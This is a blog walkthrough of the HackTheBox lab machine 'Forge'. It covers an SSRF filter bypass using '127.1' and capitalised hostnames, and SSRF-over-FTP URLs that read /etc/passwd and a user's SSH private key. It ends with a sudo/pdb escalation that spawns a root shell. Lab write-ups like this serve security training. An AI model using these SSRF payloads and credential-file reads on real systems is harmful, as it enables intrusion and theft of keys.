@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Forge Writeup / Walkthrough Hack the box</title>
+
+  <link rel="icon" type="image/png" href="/assets/images/logo.png?v=96ad5fd1fb">
+  <link rel="apple-touch-icon" href="/assets/images/logo.png?v=96ad5fd1fb">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css?v=96ad5fd1fb">
+
+  <meta name="description" content="Writeup on Forge (Linux HackTheBox), w/o Metasploit, exploiting SSRF &amp; SUDO permissions for privilege escalation.">
+    <link rel="canonical" href="https://sheerazali.com/blog/forge-writeup-walkthrough-hack-the-box/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Sheeraz Ali">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Forge Writeup / Walkthrough Hack the box">
+    <meta property="og:description" content="Writeup on Forge (Linux HackTheBox), w/o Metasploit, exploiting SSRF &amp; SUDO permissions for privilege escalation.">
+    <meta property="og:url" content="https://sheerazali.com/blog/forge-writeup-walkthrough-hack-the-box/">
+    <meta property="og:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2022/01/forge.jpg?fit&#x3D;782%2C452&amp;ssl&#x3D;1">
+    <meta property="article:published_time" content="2022-01-22T14:26:00.000Z">
+    <meta property="article:modified_time" content="2022-01-22T14:26:02.000Z">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Writeup">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ghost">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Forge Writeup / Walkthrough Hack the box">
+    <meta name="twitter:description" content="Writeup on Forge (Linux HackTheBox), w/o Metasploit, exploiting SSRF &amp; SUDO permissions for privilege escalation.">
+    <meta name="twitter:url" content="https://sheerazali.com/blog/forge-writeup-walkthrough-hack-the-box/">
+    <meta name="twitter:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2022/01/forge.jpg?fit&#x3D;782%2C452&amp;ssl&#x3D;1">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="sheeraz ali">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="HackTheBox, Writeup">
+    <meta name="twitter:site" content="@beingsheerazali">
+    <meta property="og:image:width" content="782">
+    <meta property="og:image:height" content="452">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Sheeraz Ali",
+        "url": "https://sheerazali.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://sheerazali.com/favicon.ico"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "sheeraz ali",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.gravatar.com/avatar/b78e4b3b7f8de6d5dafee8306d76ace7?s=250&r=x&d=mp",
+            "width": 250,
+            "height": 250
+        },
+        "url": "https://sheerazali.com/author/sheeraz/",
+        "sameAs": []
+    },
+    "headline": "Forge Writeup / Walkthrough Hack the box",
+    "url": "https://sheerazali.com/blog/forge-writeup-walkthrough-hack-the-box/",
+    "datePublished": "2022-01-22T14:26:00.000Z",
+    "dateModified": "2022-01-22T14:26:02.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://i0.wp.com/sheerazali.com/wp-content/uploads/2022/01/forge.jpg?fit=782%2C452&ssl=1",
+        "width": 782,
+        "height": 452
+    },
+    "keywords": "HackTheBox, Writeup",
+    "description": "Writeup on Forge (Linux HackTheBox), w/o Metasploit, exploiting SSRF &amp; SUDO permissions for privilege escalation.",
+    "mainEntityOfPage": "https://sheerazali.com/blog/forge-writeup-walkthrough-hack-the-box/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.130">
+    <link rel="alternate" type="application/rss+xml" title="Sheeraz Ali" href="https://sheerazali.com/rss/">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.51/umd/portal.min.js" data-i18n="true" data-ghost="https://sheerazali.com/" data-key="15f06e61ecb8d951198e7015b6" data-api="https://sheerazali.com/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="15f06e61ecb8d951198e7015b6" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://sheerazali.com/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://sheerazali.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=96ad5fd1fb"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=96ad5fd1fb">
+    <script defer src="/public/member-attribution.min.js?v=96ad5fd1fb"></script><style>:root {--ghost-accent-color: #FF1A75;}</style>
+</head>
+<body class="post-template tag-hackthebox tag-writeup tag-hash-import-2026-01-05-15-55">
+
+<div class="terminal-wrapper">
+
+  <header class="site-header">
+  <div class="container">
+    <div class="header-content">
+
+      <a href="https://sheerazali.com/" class="site-logo">
+        <img src="/assets/images/logo.png" alt="Sheeraz Ali">
+      </a>
+
+      <nav class="main-nav">
+        <ul>
+          <li><a href="https://sheerazali.com/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>home<span class="bracket">]</span></a></li>
+          <li><a href="/blog/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>blog<span class="bracket">]</span></a></li>
+          <li><a href="/timeline/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>timeline<span class="bracket">]</span></a></li>
+          <li><a href="/resume/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>resume<span class="bracket">]</span></a></li>
+          <li><a href="https://www.codevigilant.com/author/syed_sheeraz_ali/" target="_blank" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>cves<span class="bracket">]</span></a></li>
+          <li><a href="https://sheerazali.com/#contact" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>contact<span class="bracket">]</span></a></li>
+        </ul>
+      </nav>
+
+      <div class="header-status">
+        <span class="status-indicator">
+          <span class="status-dot"></span>
+          <span class="status-text">Online</span>
+        </span>
+      </div>
+
+    </div>
+  </div>
+</header>
+
+  <main class="main-content">
+    
+<article class="single-post">
+  <div class="container">
+
+    <header class="post-header">
+      <div class="post-meta-top">
+        <a href="https://sheerazali.com/tag/hackthebox/" class="post-category">HackTheBox</a>
+        <span class="post-date">January 22, 2022</span>
+        <span class="reading-time">10 min read</span>
+      </div>
+
+      <h1 class="post-title glitch" data-text="Forge Writeup / Walkthrough Hack the box">Forge Writeup / Walkthrough Hack the box</h1>
+
+      <div class="post-author">
+        <span class="author-label">Author:</span>
+        <a href="https://sheerazali.com/author/sheeraz/">sheeraz ali</a>
+      </div>
+    </header>
+
+    <div class="featured-image">
+      <img src="https://i0.wp.com/sheerazali.com/wp-content/uploads/2022/01/forge.jpg?fit&#x3D;782%2C452&amp;ssl&#x3D;1" alt="Forge Writeup / Walkthrough Hack the box">
+    </div>
+
+    <div class="post-body">
+      <div class="content-wrapper">
+        <div class="terminal-window">
+          <div class="terminal-header">
+            <span class="terminal-dot red"></span>
+            <span class="terminal-dot yellow"></span>
+            <span class="terminal-dot green"></span>
+            <span class="terminal-title">Forge Writeup / Walkthrough Hack the box</span>
+          </div>
+          <div class="terminal-content">
+            <h2 id="tldr">TL;DR</h2><p>This is a walkthrough writeup on Forge which is a Linux box categorized as medium on HackTheBox. The initial foothold was gained by discovering and exploiting SSRF (Server-Side Request Forgery) in a file upload functionality to access an internal sub-domain which revealed the FTP credentials using which we were able to read the SSH private key by FTPing via the SSRF endpoint . Meanwhile, the privilege escalation part was done by exploiting the SUDO permissions we had for a python script. This box primarily focused on the SSRF filter bypassing techniques.</p><h2 id="forge-writeup-scanning-network">Forge Writeup: Scanning Network</h2><p>Running the usual Nmap port scan :</p><pre><code class="language-markdown">Command used --&gt;  nmap -A -sC -sV -v -Pn -n -oN nmap.initial 10.10.11.111
+Nmap scan report for 10.10.11.111
+Host is up (0.26s latency).
+Not shown: 997 closed tcp ports (reset)
+
+PORT   STATE    SERVICE VERSION
+21/tcp filtered ftp
+22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
+|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
+|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
+80/tcp open     http    Apache httpd 2.4.41
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://forge.htb
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</code></pre><p>We have 3 ports to work with :</p><p><code>port 21</code> : FTP (which is labelled as <code>filtered</code> meaning that it is either blocked or internal only)<br><code>port 22</code> : SSH<br><code>port 80</code> : Apache web-server</p><h2 id="forge-writeup-web-enumeration">Forge Writeup: Web Enumeration</h2><p>Checking out the hosted website in browser :</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_01_image.png" class="kg-image" alt="Forge Writeup" loading="lazy" width="697" height="387"></figure><p>On browsing the target IP we were redirected to <code>forge.htb</code> which indicates that the target is using Virtual Host Routing, thus let’s add the required entry in the <code>/etc/hosts</code> file :</p><pre><code class="language-markdown">10.10.11.111	forge.htb
+</code></pre><p>Browsing <code>forge.htb</code> :</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-2.png" class="kg-image" alt="Forge Writeup" loading="lazy" width="770" height="401"><figcaption>homepage</figcaption></figure><p>Wappalyzer tells us that the server is running <strong>PHP</strong>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-6.png" class="kg-image" alt="Forge Writeup" loading="lazy" width="535" height="402"><figcaption>wappalyzer info</figcaption></figure><p>There’s a hyperlink to <code>/upload</code> directory at the top right of the page. On the <code>/upload</code> we have two ways to upload an image :</p><p>i) Upload a Local File</p><p>ii) Upload from URL</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-3.png" class="kg-image" alt="Forge Writeup" loading="lazy" width="770" height="220"><figcaption>upload local file</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-4.png" class="kg-image" alt loading="lazy" width="770" height="230"><figcaption>upload from URL</figcaption></figure><h3 id="running-a-dirbuster-scan">Running a Dirbuster Scan</h3><p>Found nothing interesting here :</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-1.png" class="kg-image" alt="Forge Writeup" loading="lazy" width="770" height="238"><figcaption>dirbuster scan</figcaption></figure><hr><h3 id="sub-domain-enumeration">Sub-Domain Enumeration</h3><ul><li>I will be using <code>wfuzz</code> for sub-domain enumeration because it offers virtual host sub-domain enumeration:</li></ul><pre><code class="language-bash">┌──(root💀kali)-[~/Desktop/Boxes/HTB/Forge/revision]
+└─# wfuzz -H "Host: FUZZ.forge.htb" --sc 200 -c -w /usr/share/wordlists/secLists/subdomains-top1million-5000.txt $IP
+
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: &lt;http://10.10.11.111/&gt;
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                    
+=====================================================================
+
+000000024:   200        1 L      4 W        27 Ch       "admin"
+
+Total time: 148.1117
+Processed Requests: 4989
+Filtered Requests: 4988
+Requests/sec.: 33.68402
+</code></pre><p>We found one sub-domain :</p><pre><code class="language-markdown">admin.forge.htb</code></pre><p>Let’s try to access it :</p><h3 id="adminforgehtb"><code>admin.forge.htb</code></h3><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-5.png" class="kg-image" alt loading="lazy" width="665" height="172"><figcaption><code>admin.forge.htb</code></figcaption></figure><p>I did try different bypasses like using <code>X-Forwarded-For</code> HTTP header, but nothing seemed to work.</p><p>😖 Let’s come back to this later.</p><hr><h2 id="uploading-reverse-shell-failed-to-execute"><strong>Uploading Reverse Shell [Failed</strong> to execute]</h2><p>Wappalyzer informed that the server is running PHP therefore we tried to upload a php reverse shell :<br></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-7.png" class="kg-image" alt="Forge Writeup" loading="lazy" width="770" height="309"><figcaption>uploading a PHP reverse shell local file</figcaption></figure><ul><li>The shell was uploaded in the <code>/uploads</code> directory with a random name.</li><li>We tried accessing the file, but the PHP reverse shell file isn’t being executed &amp; thus we were not able to get a reverse shell.</li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-8.png" class="kg-image" alt loading="lazy" width="770" height="65"><figcaption>uploaded reverse shell file</figcaption></figure><hr><h2 id="exploiting-ssrf-in-%E2%80%9Cupload-from-url%E2%80%9D-functionality">Exploiting SSRF in “Upload from URL” functionality</h2><p>Next we tried the obvious attack on the Upload from URL functionality which is “Server Side Request Forgery”. Read more about it <a href="//portswigger.net/web-security/ssrf">here</a>.</p><ul><li>When we try to access <code>http://127.0.0.1</code> , the message reveals that a “<strong>blacklsist</strong>” filter is being used to block malicious input in order to prevent SSRF attacks.</li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-9.png" class="kg-image" alt loading="lazy" width="770" height="311"><figcaption>blacklist filter</figcaption></figure><p>Trying to bypass this filter by using various workarounds, we were able bypass this filter using the payload :</p><pre><code class="language-markdown">http://127.1
+
+127.1 also resolves to "localhost"
+
+for your information, there are multiple ways to denote "localhost",
+one of which is "127.1" 😉</code></pre><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-10.png" class="kg-image" alt loading="lazy" width="770" height="317"><figcaption>Exploiting SSRF</figcaption></figure><p>Next, we tried to access some sensitive files on the server using the <code>file</code> protocol :</p><pre><code class="language-markdown">file:///etc/passwd</code></pre><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-11.png" class="kg-image" alt loading="lazy" width="770" height="270"><figcaption><code>file</code> protocol is blocked</figcaption></figure><p>Ahh, sadly it seems like only <code><strong>http</strong></code> &amp; <code><strong>https</strong></code> protocols are allowed.</p><hr><h2 id="trying-to-access-adminforgehtb">Trying to access <code>admin.forge.htb</code></h2><ul><li>The homepage on this sub-domain says : “<strong>Only localhost is allowed!</strong>”</li></ul><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_01_image-15.png" class="kg-image" alt loading="lazy" width="626" height="151"></figure><p>Now, we know that we have an SSRF vulnerable endpoint, let’s try accessing this sub-domain from there because then the request for accessing <code>admin.forge.htb</code> will be going from the localhost 😈</p><p>Trying to access <code>http://forge.htb</code> first in order to figure out the filter bypass :</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_01_image-12.png" class="kg-image" alt="Forge Writeup" loading="lazy" width="770" height="346"></figure><p>Bypassing the blacklist filter by capitalizing the letters : <code>http://FORGE.htb</code></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-13.png" class="kg-image" alt="Forge Writeup" loading="lazy" width="770" height="280"><figcaption>Bypassing the filter</figcaption></figure><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_01_image-23.png" class="kg-image" alt loading="lazy" width="770" height="48"></figure><p>Hmm, we can’t see the contents of the page, so let’s intercept this with Burp.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-16.png" class="kg-image" alt="Forge Writeup" loading="lazy" width="770" height="254"><figcaption>Intercepting request in Burp</figcaption></figure><p>Ahaaa, as you can see the header “<strong>Content-Type: image/jpg</strong>”. Thats the reason our browser is throwing an error.</p><p>Thus, viewing the response (which contains HTML webage source code) in Burp we can verify that we have a successfully bypassed the filter.</p><hr><p>Now, coming to the main part, let’s try accessing the <code>admin.forge.htb</code> sub-doamin using a similar technique to bypass the filter.</p><pre><code class="language-markdown">Bypassing the blacklist filter using capitalized letters -&gt;
+
+payload : http://admin.FORGE.htb</code></pre><p>Again intercepting the request &amp; response in Burp, we can see that we have successfully accessed the <code>admin.forge.htb</code> sub-domain –</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-17.png" class="kg-image" alt="Forge Writeup" loading="lazy" width="764" height="596"><figcaption>response for <code>admin.forge.htb</code></figcaption></figure><ul><li>You could also intercept the response in Burp and change the <code>Content-Type</code> header to the following in the intercepted response and view the webpage in browser as well :</li></ul><pre><code class="language-markdown">Content-Type: text/html; charset=utf-8</code></pre><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-18.png" class="kg-image" alt="Forge Writeup" loading="lazy" width="770" height="248"><figcaption><code>admin.forge.htb</code></figcaption></figure><hr><p>We can spot two hyperlinks on the <code>admin.forge.htb</code> page :</p><pre><code class="language-markdown">admin.forge.htb/announcements
+admin.forge.htb/upload</code></pre><p>Let’s visit them too (using the SSRF endpoint ofc) :</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-19.png" class="kg-image" alt="Forge Writeup" loading="lazy" width="770" height="185"><figcaption><code>admin.forge.htb/announcements</code></figcaption></figure><p>→ An internal ftp server has been setup with credentials as <strong>user:heightofsecurity123!</strong> → The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url. → The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</p><p>We have the FTP credentials 🙂</p><p>And the upload functionality on the <code>admin.forge.htb/upload</code> supports <code>ftp</code> protocol.</p><hr><h2 id="connecting-to-ftp-via-ssrf-endpoint">Connecting to FTP (via SSRF endpoint)</h2><p>I googled to find about “<em>how to FTP via URL</em>” :</p><p><a href="//www.webhostface.com/kb/knowledgebase/use-ftp-browser/">How to use FTP from a browser? (webhostface.com)</a></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-20.png" class="kg-image" alt loading="lazy" width="770" height="156"><figcaption>FTP via URL</figcaption></figure><p>Going ahead and connecting to FTP using URL in the SSRF endpoint, we get the following response :</p><pre><code class="language-markdown">Format for FTP protocol via URL --&gt;  ftp://username:password@hostname
+
+http://admin.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.1
+</code></pre><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-21.png" class="kg-image" alt loading="lazy" width="770" height="303"><figcaption>FTP via URL</figcaption></figure><p>This seems to be the <code>home</code> directory of a user on the box because we can see <code>user.txt</code> listed in here.</p><p>Listing the users in <code>/etc/passwd</code> we saw that there exists only one user other than <code>root</code> which is  user <code><strong>web</strong></code></p><pre><code>http://admin.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.1/etc/passwd
+</code></pre><hr><hr><h3 id="fetching-the-ssh-key-idrsa-via-ftp">Fetching the SSH key <code>id_rsa</code> via FTP</h3><p>We got the SSH private key via FTP for user <code>web</code> :</p><pre><code class="language-markdown">http://admin.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.1/.ssh/id_rsa</code></pre><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_01_image-22.png" class="kg-image" alt loading="lazy"><figcaption>SSH id_rsa for user <code>web</code></figcaption></figure><hr><h2 id="forge-writeup-user-flag-%E2%9B%B3">Forge Writeup: User Flag ⛳</h2><p>Using the obtained SSH key to connect via SSH to user <code>user</code> on the box :</p><pre><code class="language-bash">┌──(root💀kali)-[~/Desktop/Boxes/HTB/Forge/revision]
+└─# ssh -i user_id.rsa user@$IP
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)
+
+ * Documentation:  &lt;https://help.ubuntu.com&gt;
+ * Management:     &lt;https://landscape.canonical.com&gt;
+ * Support:        &lt;https://ubuntu.com/advantage&gt;
+
+  System information as of Thu 20 Nov 2021 08:01:10 AM UTC
+
+  System load:  0.0               Processes:             224
+  Usage of /:   44.0% of 6.82GB   Users logged in:       0
+  Memory usage: 25%               IPv4 address for eth0: 10.10.11.111
+  Swap usage:   0%
+
+0 updates can be applied immediately.
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to &lt;https://changelogs.ubuntu.com/meta-release-lts&gt;. Check your Internet connection or proxy settings
+
+Last login: Wed Nov 19 17:26:02 2021 from 10.10.14.4
+
+user@forge:~$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+
+user@forge:~$ cat user.txt 
+f2d52***************************</code></pre><hr><h2 id="forge-writeup-privilege-escalation">Forge Writeup: Privilege Escalation</h2><p>Checking the <code>sudo</code> permissions for user <code>web</code> :</p><pre><code class="language-bash">user@forge:~$ sudo -l
+Matching Defaults entries for user on forge:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin
+
+User user may run the following commands on forge:
+    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
+
+user@forge:/opt$ ls -l
+total 4
+-rwxr-xr-x 1 root root 1447 May 31  2021 remote-manage.py</code></pre><p>Content of <code>remote-manage.py</code></p><pre><code class="language-python">user@forge:/opt$ cat remote-manage.py       
+                                                                                                                                       
+#!/usr/bin/env python3
+import socket           
+import random                                                                                                                                                                               
+import subprocess                                                                             
+import pdb       
+                                               
+port = random.randint(1025, 65535)
+
+try:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind(('127.0.0.1', port))
+    sock.listen(1)
+    print(f'Listening on localhost:{port}')
+    (clientsock, addr) = sock.accept()
+    clientsock.send(b'Enter the secret passsword: ')
+    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
+        clientsock.send(b'Wrong password!\\n')
+    else:
+        clientsock.send(b'Welcome admin!\\n')
+        while True:
+            clientsock.send(b'\\nWhat do you wanna do: \\n')
+            clientsock.send(b'[1] View processes\\n')
+            clientsock.send(b'[2] View free memory\\n')
+            clientsock.send(b'[3] View listening sockets\\n')
+            clientsock.send(b'[4] Quit\\n')
+            option = int(clientsock.recv(1024).strip())
+            if option == 1:
+                clientsock.send(subprocess.getoutput('ps aux').encode())
+            elif option == 2:
+                clientsock.send(subprocess.getoutput('df').encode())
+            elif option == 3:
+                clientsock.send(subprocess.getoutput('ss -lnt').encode())
+            elif option == 4:
+                clientsock.send(b'Bye\\n')
+                break
+except Exception as e:
+    print(e)
+    pdb.post_mortem(e.__traceback__)
+finally:
+    quit()
+</code></pre><p>This is a simple script which :</p><ul><li>Selects a random port &amp; listens on that port on localhost (<code>127.0.0.1</code>)</li><li>When we connect to this port on “localhost” we are asked for a password (which can be seen the contents of the file → <code>secretadminpassword</code>)</li><li>After entering the correct password, we are given 4 choices.</li><li>We can give the number corresponding to the choice of the option we want to choose.</li></ul><pre><code class="language-markdown">user@forge:~$ nc 127.0.0.1 14801
+
+Enter the secret passsword: secretadminpassword
+Welcome admin!
+
+What do you wanna do: 
+[1] View processes
+[2] View free memory
+[3] View listening sockets
+[4] Quit</code></pre><ul><li>Depending on the choice the user makes, a corresponding command is run and its output is sent back to the connected user.</li><li>And in case there is any kind of error, the script has an <code>except</code> which launches the <code>pdb</code> (<strong>python debugger</strong>) for the error encountered.</li></ul><h3 id="testing-remote-managepy">Testing <code>remote-manage.py</code></h3><p>We tested this program for an invalid input which raises an error and in turn launches <code><strong>pdb</strong></code> <strong>(Python Debugger)</strong> on the host.</p><p>Giving an invalid input to the program :</p><pre><code class="language-markdown">user@forge:~$ nc 127.0.0.1 14801
+
+Enter the secret passsword: secretadminpassword
+Welcome admin!
+
+What do you wanna do: 
+[1] View processes
+[2] View free memory
+[3] View listening sockets
+[4] Quit
+
+iNeedaGirlfriend&lt;3</code></pre><p><code><strong>pdb</strong></code> <strong>prompt</strong> is launched on the  host on receiving the invalid input :</p><pre><code class="language-bash">user@forge:/opt$ sudo /usr/bin/python3 /opt/remote-manage.py
+Listening on localhost:14801
+
+invalid literal for int() with base 10: b'iNeedaGirlfriend&lt;3'
+&gt; /opt/remote-manage.py(27)&lt;module&gt;()
+-&gt; option = int(clientsock.recv(1024).strip())
+(Pdb) 
+</code></pre><hr><p>Searching the web about how to privesc using <code>pdb</code> we found <a href="//gtfobins.github.io/gtfobins/pdb/#sudo">this on GTFO bins</a> :</p><p>So, turns out that we can simply run python commands inside the <code>pdb</code> prompt 😄</p><hr><h2 id="forge-writeup-root-flag-%E2%9B%B3">Forge Writeup: Root Flag ⛳</h2><p>Let’s spawn a root shell from inside the <code><strong>pdb</strong></code> prompt !</p><pre><code class="language-bash">user@forge:/opt$ sudo /usr/bin/python3 /opt/remote-manage.py
+Listening on localhost:14801
+invalid literal for int() with base 10: b'iNeedaGirlfriend&lt;3'
+&gt; /opt/remote-manage.py(27)&lt;module&gt;()
+-&gt; option = int(clientsock.recv(1024).strip())
+
+(Pdb) import os;
+(Pdb) os.system('/bin/sh');
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+c78e1***************************
+</code></pre><hr><p>Yayy ! Congrats on rooting Forge 🎉🥳</p><p>Do checkout other interesting writeups &amp; walkthroughs on <a href="https://sheerazali.com/">sheerazali.com</a></p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="post-tags">
+      <span class="tags-label">Tags:</span>
+      <a href="/tag/hackthebox/" class="tag">HackTheBox</a>
+      <a href="/tag/writeup/" class="tag">Writeup</a>
+    </div>
+
+  </div>
+</article>
+
+  <section class="related-posts">
+    <div class="container">
+      <h3 class="section-title"><span class="prefix">./</span>related_writeups</h3>
+      <div class="related-grid">
+        <a href="/blog/raining-cves-on-wordpress-plugins-using-semgrep-slide-deck/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Raining CVE&#x27;s on wordpress plugins using Semgrep Slide Deck</h4>
+          <span class="date">Sep 10, 2022</span>
+        </a>
+        <a href="/blog/shibboleth-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Shibboleth Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 10, 2022</span>
+        </a>
+        <a href="/blog/horizontall-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Horizontall Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 05, 2022</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  </main>
+
+  <footer class="site-footer">
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-brand">
+        <span class="terminal-prefix">&gt;</span>
+        <span class="brand-text">sheeraz_ali</span>
+        <span class="cursor">_</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://www.linkedin.com/in/sheeraz-ali-979943177/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a>
